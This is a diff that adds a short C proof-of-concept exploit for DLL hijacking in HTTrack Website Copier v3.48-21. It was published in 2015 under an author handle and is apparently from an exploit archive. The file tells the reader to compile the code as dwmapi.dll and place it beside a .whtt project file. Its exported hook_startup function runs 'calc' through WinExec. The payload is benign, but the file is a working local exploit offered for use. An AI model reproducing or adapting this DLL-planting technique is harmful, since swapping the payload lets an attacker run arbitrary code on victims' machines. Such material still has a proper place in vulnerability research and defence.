@@ -1,0 +1,20 @@
+#[+] Author: TUNISIAN CYBER
+#[+] Exploit Title: HTTrack Website Copier v3.48-21 DLL Hijacking
+#[+] Date: 28-03-2015
+#[+] Type: Local Exploits
+#[+] Vendor: https://httrack.com/page/2/fr/index.html
+#[+] Tested on: WinXp/Windows 7 Pro
+#[+] Friendly Sites: sec4ever.com
+#[+] Twitter: @TCYB3R
+#[+] Create Compile the file then rename it to dwmapi.dll then create .whtt file , make sure that
+# the 2 files are in the same dir.
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+DllExport void hook_startup() { exp(); }
+ 
+int exp()
+{
+  WinExec("calc", 0);
+  exit(0);
+  return 0;
+}
